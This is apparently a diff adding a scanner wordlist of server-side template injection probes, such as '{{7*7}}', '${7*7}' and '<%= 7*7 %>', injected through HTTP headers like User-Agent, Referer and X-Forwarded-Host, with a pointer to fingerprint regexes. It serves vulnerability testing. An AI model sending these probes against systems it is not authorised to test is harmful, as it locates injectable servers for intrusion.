@@ -1,0 +1,14 @@
+# SSTI (server-side template injection) via headers
+# Fingerprints: fingerprints/ssti.txt (nuclei-style regexes: 49, 7777777, template errors)
+X-Template: {{7*7}}
+X-Template: {{7*'7'}}
+X-Template: ${7*7}
+X-Template: <%= 7*7 %>
+X-Tpl: {{7*7}}
+X-Name: {{7*7}}
+X-Search: {{7*'7'}}
+X-Debug: ${7*7}
+User-Agent: {{7*7}}
+Referer: {{7*7}}
+Accept-Language: {{7*7}}
+X-Forwarded-Host: {{7*7}}.example.com
